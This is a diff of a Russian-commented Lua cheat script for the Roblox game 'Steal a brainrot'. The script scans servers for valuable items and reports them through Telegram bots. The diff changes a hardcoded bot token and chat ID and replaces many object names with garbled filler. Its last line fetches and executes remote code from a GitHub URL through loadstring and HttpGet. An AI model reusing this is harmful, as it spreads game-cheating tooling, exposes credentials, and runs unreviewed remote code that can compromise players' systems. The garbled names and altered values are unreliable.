@@ -31,12 +31,12 @@ local SCANNER_SETTINGS = {
 
 -- Настройки Telegram ботов
 local TG_MAIN = {
-    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
-    ChatId = "1072158346",
+    Token = "8216378798:AAGEMg0TE-Cc_cLsF2QWkm8vbcYWMNhfvJE",
+    ChatId = "5263524993",
     Enabled = true,
     ImportantObjects = {
-        ["Secret Lucky Block"] = true,
-        ["Pot H77otspot"] = true,
+        ["Sedasdsacret Lucky Block"] = true,
+        ["Pot Hotdsadasspot"] = true,
         ["La Grande Combinasion"] = true,
         ["Garama and Madundung"] = true,
         ["Nuclearo Dinossauro"] = true,
@@ -46,13 +46,13 @@ local TG_MAIN = {
         ["Los Hotspotsitos"] = true,
         ["Esok Sekolah"] = true,
         ["La Supreme Combinasion"] = true,
-        ["No77ot"] = true,
+        ["Nooo My Hotspot"] = true,
         ["Ketupat Kepat"] = true,
-        ["Noo567tspot"] = true,
+        ["Noddoo My Hotddspot"] = true,
         ["Spaghetti Tualetti"] = true,
         ["Strawberry Elephant"] = true,
         ["Ketchuru and Musturu"] = true,
-        ["hh"] = true,
+        ["Lddos Noddoo My Hotsp3ddotsitos"] = true,
         ["La Kark7658erkar Combinasion"] = true,
         ["Tralaledon"] = true,
         ["Los Bros"] = true,
@@ -60,9 +60,7 @@ local TG_MAIN = {
         ["Las sis"] = true,
         ["Celularcini Viciosini"] = true,
         ["La Extinct Grande"] = true,
-        ["Los Chicleteiras"] = true,
-        ["Tacorita Bicicleta"] = true,
-        ["Tictac Sahur"] = true
+        ["Los Chicleteiras"] = true
     }
 }
 
@@ -89,16 +87,16 @@ end
 
 -- Доходы объектов (все значения в /s)
 local OBJECT_INCOME = {
-    ["La Vacca Saturno Saturnita"] = "300K/s",
+    ["La Vacca Saturno Saturnita"] = "250K/s",
     ["Chimpanzini Spiderini"] = "325K/s",
     ["Los Tralaleritos"] = "500K/s",
     ["Las Tralaleritas"] = "625K/s",
     ["Graipuss Medussi"] = "1M/s",
     ["Torrtuginni Dragonfrutini"] = "350K/s",
-    ["Pot Hotsp666ot"] = "2.5M/s",
+    ["Pot Hotdasdaspot"] = "2.5M/s",
     ["La Grande Combinasion"] = "10M/s",
     ["Garama and Madundung"] = "50M/s",
-    ["Secret Lucky Block"] = "???/s",
+    ["Secret Lucdsadaky Block"] = "???/s",
     ["Dragon Cannelloni"] = "100M/s",
     ["Nuclearo Dinossauro"] = "15M/s",
     ["Las Vaquitas Saturnitas"] = "750K/s",
@@ -110,20 +108,18 @@ local OBJECT_INCOME = {
     ["Karkerkar Kurkur"] = "275K/s",
     ["Job Job Job Sahur"] = "700K/s",
     ["La Supreme Combinasion"] = "40M/s",
-    ["Nooo My7777t"] = "1.5M/s",
-    ["Spaghetti Tualetti"] = "60M/s",
+    ["Noddoo My Hotspot"] = "10M/s",
+    ["Spaghetti Tualetti"] = "7.5M/s",
     ["Strawberry Elephant"] = "250M/s",
-    ["Ketchuru and Musturu"] = "42.5M/s",
-    ["Los Nooo My Hotspotsitos"] = "5M/s",
+    ["Ketchuru and Musturu"] = "50M/s",
+    ["Ldds Noddoo My Hotspotsitos"] = "5M/s",
     ["La Kark767erkar Combinasion"] = "50M/s",
     ["Tralaledon"] = "50M/s",
-    ["Los Bros"] = "27.5M/s",
-    ["Las Sis"] = "17.5M/s",
-    ["Celularcini Viciosini"] = "22.5M/s",
-    ["La Extinct Grande"] = "23.5M/s",
-    ["Los Chicleteiras"] = "7M/s",
-    ["Tacorita Bicicleta"] = "16.5M/s",
-    ["Tictac Sahur"] = "37M/s"
+    ["Los Bros"] = "50M/s",
+    ["Las Sis"] = "50M/s",
+    ["Celularcini Viciosini"] = "50M/s",
+    ["La Extinct Grande"] = "50M/s",
+    ["Los Chicleteiras"] = "50M/s"
 }
 
 -- Множители мутаций и трейтов
@@ -163,7 +159,7 @@ local OBJECT_EMOJIS = {
     ["Las Tralaleritas"] = "🌸",
     ["Graipuss Medussi"] = "🦑",
     ["Torrtuginni Dragonfrutini"] = "🐉",
-    ["Pot Ho666tspot"] = "📱",
+    ["Pot Hotspot"] = "📱",
     ["La Grande Combinasion"] = "❗️",
     ["Garama and Madundung"] = "🥫",
     ["hff"] = "⬛️",
@@ -175,7 +171,7 @@ local OBJECT_EMOJIS = {
     ["Agarrini la Palini"] = "🥄",
     ["Los Hotspotsitos"] = "☎️",
     ["Esok Sekolah"] = "🏠",
-    ["N777ot"] = "👽",
+    ["Nooo My Hotspot"] = "👽",
     ["Job Job Job Sahur"] = "⬜️",
     ["La Supreme Combinasion"] = "🔫",
     ["Admin Lucky Block"] = "🆘",
@@ -183,16 +179,14 @@ local OBJECT_EMOJIS = {
     ["Strawberry Elephant"] = "🐘",
     ["Spaghetti Tualetti"] = "🚽",
     ["Ketchuru and Musturu"] = "🍾",
-    ["hh"] = "🥔",
+    ["Lddos Nooo My Hotspdotsitos"] = "🥔",
     ["La Kark666erkar Combinasion"] = "🥊",
     ["Tralaledon"] = "🦈",
     ["Los Bros"] = "✊",
     ["Las Sis"] = "👩",
     ["Celularcini Viciosini"] = "🦾",
     ["La Extinct Grande"] = "🦴",
-    ["Los Chicleteiras"] = "💰",
-    ["Tacorita Bicicleta"] = "🌮",
-    ["Tictac Sahur"] = "🕰"
+    ["Los Chicleteiras"] = "💰"
 }
 
 -- Эмодзи для мутаций
@@ -214,7 +208,7 @@ local OBJECT_NAMES = {
     "Las Tralaleritas",
     "Graipuss Medussi",
     "Torrtuginni Dragonfrutini",
-    "Pot Ho566tspot",
+    "Pot Hotspot",
     "La Grande Combinasion",
     "Garama and Madundung",
     "Sec555ret Lucky Block",
@@ -226,7 +220,7 @@ local OBJECT_NAMES = {
     "Agarrini la Palini",
     "Los Hotspotsitos",
     "Esok Sekolah",
-    "N7777ot",
+    "Nooo My Hodtspot",
     "Job Job Job Sahur",
     "La Supreme Combinasion",
     "Admin Lucky Block",
@@ -234,16 +228,14 @@ local OBJECT_NAMES = {
     "Strawberry Elephant",
     "Spaghetti Tualetti",
     "Ketchuru and Musturu",
-    "Los Nooo My Ho7tos",
+    "Los Nodoo My Hotspotsitos",
     "La Kark56656erkar Combinasion",
     "Los Bros",
     "Tralaledon",
     "Las Sis",
     "Celularcini Viciosini",
     "La Extinct Grande",
-    "Los Chicleteiras",
-    "Tacorita Bicicleta",
-    "Tictac Sahur"
+    "Los Chicleteiras"
 }
 
 -- Системные переменные
@@ -766,4 +758,4 @@ print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
